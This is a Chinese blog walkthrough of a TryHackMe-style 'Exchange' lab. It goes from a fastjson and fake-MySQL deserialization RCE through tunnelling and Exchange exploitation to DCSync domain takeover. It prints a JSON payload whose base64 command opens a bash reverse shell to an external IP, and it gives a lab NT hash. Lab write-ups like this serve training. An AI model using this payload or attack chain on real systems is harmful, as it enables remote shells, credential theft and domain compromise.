# Exchange

看到奖品还有证书，还涉及oscp方面的东西，过来打打

**感谢TryHackMe**

Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。

由于是付费的，时间就是金钱，为了节省点钱，我只好利用wp来进行**半引导式**渗透

**借此来复习一下TryHackMe**

**(事实上我也看了其他几个房间的wp，得出的结论是thm教会了我太多太多，thm世界第一)**

![在这里插入图片描述](https://img-blog.csdnimg.cn/8b6f5f2bcae144c5b09ed5c675dc1723.png)

---

## 端口扫描

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb293b04b13c4d3588c842fd7eee9d43.png)

## Web枚举 - 入口

进入8000，直接注册个账号

![在这里插入图片描述](https://img-blog.csdnimg.cn/b6d3e87b83e34ec7867646f185580e48.png)

这里根据wp，存在一个可以让我们RCE的漏洞

但需要我们开启服务，由于我们没有公网ip，我们就借助thm的网络kali来帮助我们实现

**如果java版本过高，请下载java8,然后为mysql_fake_server配置好java环境，否则会报错， https://repo.huaweicloud.com/java/jdk/**

**另外，这里需要提前下载ysoserial jar包，https://github.com/frohoff/ysoserial/releases**

**设置好config.json**

![在这里插入图片描述](https://img-blog.csdnimg.cn/f58ee1bef2504eb9bead1efd371a3c7a.png)

thm的网络kali开启fake mysql server

![在这里插入图片描述](https://img-blog.csdnimg.cn/0586f6fabb164aad9135abb2fe317b62.png)

把服务开起来之后就可以尝试利用了

/user/list?search=payload

payload:

```yaml
{ "name": { "@type": "java.lang.AutoCloseable", "@type": "com.mysql.jdbc.JDBC4Connection", "hostToConnectTo": "攻击者IP", "portToConnectTo": 3306, "info": { "user": "yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4yNTQuMTUxLjE2My84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}", "password": "pass", "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor", "autoDeserialize": "true", "NUM_HOSTS": "1" } }
```

其中的base64是shellcode，需要改成自己的，然后再base64

然后将payload进行urlencode之后交付

![在这里插入图片描述](https://img-blog.csdnimg.cn/b91c0bb620b649b9847dce72766b14b7.png)

成功getshell，并且拿到flag1

![在这里插入图片描述](https://img-blog.csdnimg.cn/4f61b0a1b647478799b55afcf06d2f1e.png)

## sshuttle搭建内网隧道

查看内网网段

![在这里插入图片描述](https://img-blog.csdnimg.cn/bbbe8d8778034ef0af9fe017c08c1892.png)

首先使用ssh-keygen生成ssh key

![在这里插入图片描述](https://img-blog.csdnimg.cn/d5799e5251cf4b79ba9dc27c88241fc5.png)

将公钥改为authorized_keys丢到.ssh目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/c41f8f915aa44639ade32469bd75af25.png)

将私钥下回攻击机，然后修改私钥权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/e6737dceaef7429093e6b37b23560594.png)

sshuttle搭建隧道

![在这里插入图片描述](https://img-blog.csdnimg.cn/ea5f89abc451438d8eeec36afc2a2ac1.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ca308bc21c8b41f18e74e6fea97d44ec.png)

.2是dc，.26是win10

## 内网横向移动 - Exchange

.9有一个exchange

![在这里插入图片描述](https://img-blog.csdnimg.cn/3e9032d4d6194086b92e8b9430055ced.png)

上exprolog

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f39d366c850492a8bdeecac0c716ab7.png)

现在能够RCE

![在这里插入图片描述](https://img-blog.csdnimg.cn/d35451bde6fb43f88cbe3ce73bf26ec4.png)

flag2

![在这里插入图片描述](https://img-blog.csdnimg.cn/eb95fc902ec648d382433e82bee219c3.png)

## 内网横向移动 - DACL-WriteDACL

这里为了省时间，就懒得开rdp进去传mimikataz之类的提取凭据操作了

直接wp快速拿到exchange的机器账户和zhangtong的 nt hash

	0beff597ee3d7025627b2d9aa015bf4c

应该是通过bloodhound这类工具发现exchange机器账户对整个domain-object有writedacl权限

通过它来使用impacket的dacledit为我们已经获得的zhangtong赋予dcsync权限,然后进行dcsync获取DA账户的ntlm hash

psexec进dc

![在这里插入图片描述](https://img-blog.csdnimg.cn/90ad9c83895f4d98832dca6c86c95f4d.png)

flag4

![在这里插入图片描述](https://img-blog.csdnimg.cn/35401568ad864f689f692e703d57ae17.png)

## 最后的flag

smbclient进.26的smb C$ share

![在这里插入图片描述](https://img-blog.csdnimg.cn/f74b1cd645474392b5ff8492e9f319b0.png)

在lumia的桌面下有个secret.zip, 但是有密码

由于thm的kali有上限时间，准备到时了，为了在kali关闭之前搞定，我选择直接wp:

	PTH Exchange导出Lumia mailbox里面的全部邮件以及附件
	item-0.eml，提示密码是手机号
	导出的附件里面有一个csv，里面全是手机号

然后常规zip2john加john

然后出密码，查看flag.docx得到flag3

![在这里插入图片描述](https://img-blog.csdnimg.cn/5fc13e0d21fc45f78f3cfc9053540eeb.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ab8e7e25d76a468c84fd0a0e4ded37f7.png)

## 结束

其实这套机器整体并不难，除了入口点有点小坑之外，其他都还好，包括后面的横向移动和域渗透，事实上都非常简单，thm都是教过的非常全面的，其实跟thm的wreath有点相似。只是在这里，每一分每一秒都是钱，并且在最后，我的thm的kali也即将到期并且无法续期，我只好跟着wp的思路来极速完成这个机器

最后感谢TryHackMe的优质教程和房间，令我学的这么多

也感谢wp作者：小离-xiaoli写的[writeup](https://mp.weixin.qq.com/s?__biz=MzUyNzk2NDcwMw==&mid=2247488275&idx=1&sn=b9f8fe551dc051613869b61f0ffda211&chksm=fa76dc63cd015575993488a29a297b7bc6340e881510dc0caa6081775b2ee71d6dcdcad553af&mpshare=1&scene=23&srcid=040708PO4wfEufH65jsiLD7f&sharer_sharetime=1680859750565&sharer_shareid=69363f9f5d6174e530a524332f37bf0a#rd)，才能令像我这种穷鬼能加速和跳过一部分